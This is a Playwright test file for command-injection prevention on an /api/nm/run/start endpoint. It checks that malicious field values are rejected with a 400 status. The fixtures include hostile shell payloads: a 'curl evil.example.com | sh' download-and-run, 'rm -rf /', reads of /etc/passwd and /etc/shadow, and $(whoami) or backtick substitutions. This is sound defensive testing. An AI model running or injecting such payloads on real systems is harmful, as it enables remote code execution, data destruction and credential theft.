// ABS-143: command-injection prevention tests for /api/nm/run/start.
//
// Verifies that user-controlled fields are validated against allow-lists
// and that malicious payloads are rejected with 400 before reaching execFile.

import { test, expect } from "@playwright/test";

const VALID_BODY = {
  maxAgents: 3,
  label: "Triaged",
  model: "opus",
  agentModel: "sonnet",
  agentEffort: "high",
  agentTokenLimit: 10,
  reviewerModel: "sonnet",
  reviewerTokenLimit: 2,
  deploy: false,
  dryRun: true,
};

test.describe("NM /api/nm/run/start — injection prevention (ABS-143)", () => {
  test("label with shell metacharacters is rejected", async ({ request }) => {
    const res = await request.post("/api/nm/run/start", {
      data: { ...VALID_BODY, label: 'X"; rm -rf ~ #' },
    });
    expect(res.status()).toBe(400);
    const body = await res.json();
    expect(body.ok).toBe(false);
    expect(body.errors).toEqual(
      expect.arrayContaining([expect.objectContaining({ field: "label" })]),
    );
  });

  test("issue with command injection is rejected", async ({ request }) => {
    const res = await request.post("/api/nm/run/start", {
      data: { ...VALID_BODY, issue: "ABS-1; curl evil.example.com | sh" },
    });
    expect(res.status()).toBe(400);
    const body = await res.json();
    expect(body.errors).toEqual(
      expect.arrayContaining([expect.objectContaining({ field: "issue" })]),
    );
  });

  test("model outside allowed pattern is rejected", async ({ request }) => {
    const res = await request.post("/api/nm/run/start", {
      data: { ...VALID_BODY, model: "evil$(whoami)" },
    });
    expect(res.status()).toBe(400);
    const body = await res.json();
    expect(body.errors).toEqual(
      expect.arrayContaining([expect.objectContaining({ field: "model" })]),
    );
  });

  test("agentModel with backticks is rejected", async ({ request }) => {
    const res = await request.post("/api/nm/run/start", {
      data: { ...VALID_BODY, agentModel: "`id`" },
    });
    expect(res.status()).toBe(400);
  });

  test("agentEffort outside allow-list is rejected", async ({ request }) => {
    const res = await request.post("/api/nm/run/start", {
      data: { ...VALID_BODY, agentEffort: "high; rm -rf /" },
    });
    expect(res.status()).toBe(400);
  });

  test("resumeIssue with injection payload is rejected", async ({
    request,
  }) => {
    const res = await request.post("/api/nm/run/start", {
      data: { ...VALID_BODY, resume: true, resumeIssue: "ABS-1 && cat /etc/passwd" },
    });
    expect(res.status()).toBe(400);
    const body = await res.json();
    expect(body.errors).toEqual(
      expect.arrayContaining([
        expect.objectContaining({ field: "resumeIssue" }),
      ]),
    );
  });

  test("reviewerModel with pipe is rejected", async ({ request }) => {
    const res = await request.post("/api/nm/run/start", {
      data: { ...VALID_BODY, reviewerModel: "sonnet|cat /etc/shadow" },
    });
    expect(res.status()).toBe(400);
  });

  test("agentTokenLimit with non-numeric value is rejected", async ({
    request,
  }) => {
    const res = await request.post("/api/nm/run/start", {
      data: { ...VALID_BODY, agentTokenLimit: "10; rm -rf /" },
    });
    expect(res.status()).toBe(400);
  });

  test("valid body returns 200 (regression guard)", async ({ request }) => {
    const res = await request.post("/api/nm/run/start", {
      data: VALID_BODY,
    });
    expect(res.status()).toBe(200);
    const body = await res.json();
    expect(body.ok).toBe(true);
    expect(body.testMode).toBe(true);
  });

  test("valid body with issue returns 200", async ({ request }) => {
    const res = await request.post("/api/nm/run/start", {
      data: { ...VALID_BODY, issue: "ABS-999" },
    });
    expect(res.status()).toBe(200);
    const body = await res.json();
    expect(body.ok).toBe(true);
    expect(body.argv).toContain("--issue");
  });

  test("valid body with resume flags returns 200", async ({ request }) => {
    const res = await request.post("/api/nm/run/start", {
      data: { ...VALID_BODY, resume: true, resumeIssue: "ABS-42", resumeQueued: true },
    });
    expect(res.status()).toBe(200);
    const body = await res.json();
    expect(body.argv).toContain("--resume");
    expect(body.argv).toContain("--resume-queued");
    const idx = body.argv.indexOf("--resume-issue");
    expect(body.argv[idx + 1]).toBe("ABS-42");
  });

  test("multiple invalid fields produce multiple errors", async ({
    request,
  }) => {
    const res = await request.post("/api/nm/run/start", {
      data: {
        ...VALID_BODY,
        model: "$(whoami)",
        issue: "DROP TABLE;",
        agentEffort: "extreme",
      },
    });
    expect(res.status()).toBe(400);
    const body = await res.json();
    expect(body.errors.length).toBeGreaterThanOrEqual(3);
  });
});
